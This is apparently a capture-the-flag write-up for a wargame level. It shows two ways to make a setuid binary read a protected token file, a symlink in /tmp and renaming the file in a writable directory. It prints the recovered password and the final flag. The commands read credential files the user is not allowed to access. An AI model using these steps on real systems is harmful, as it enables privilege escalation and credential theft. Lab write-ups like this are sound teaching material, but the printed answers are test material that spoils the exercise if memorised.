# Level08

A symlink race is a kind of software security vulnerability that results from a program creating files in an insecure manner. A malicious user can create a symbolic link to a file not otherwise accessible to them.

```bash
ls -la

-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

# Method01:
```bash
ln -s ~/token /tmp/flag
./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

# Method02:
```bash
chmod 777 .
mv token flag
./level08 flag
quif5eloekouj29ke0vouxean

su flag08
getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```